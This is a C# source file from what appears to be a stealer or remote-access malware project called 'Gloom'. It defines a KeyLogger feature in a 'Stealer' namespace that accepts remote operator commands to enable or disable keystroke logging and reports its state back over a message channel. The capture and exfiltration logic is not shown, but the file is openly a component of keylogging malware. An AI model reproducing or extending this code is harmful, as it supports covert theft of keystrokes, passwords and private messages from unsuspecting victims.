using static Gloom.KeyLoggerData;

namespace Gloom.Features.Stealer;
internal class KeyLogger : BaseFeature
{
	private bool active = true;

	public override Guid[] AcceptedOps => new Guid[] { OpCodes.KeyLogRequest };

	public KeyLogger(IMessageSender sender) : base(sender)
	{
	}

	public override async Task HandleAsync(Guid op, byte[] data)
	{
		if (op != OpCodes.KeyLogRequest)
			return;
		KeyLoggerRequest req = StructConvert.Byte2Struct<KeyLoggerRequest>(data);
#if DEBUG
		Console.WriteLine("KeyLogger request receive: " + req.RequestType);
#endif
		if (req.RequestType == EnableKeyLogger)
		{
			active = true;
			await SendAsync(OpCodes.KeyLogResponse, new KeyLoggerStateResponse { Enabled = active }, true);
		}

		if (req.RequestType == DisableKeyLogger)
		{
			active = false;
			await SendAsync(OpCodes.KeyLogResponse, new KeyLoggerStateResponse { Enabled = active }, true);
		}
	}
}
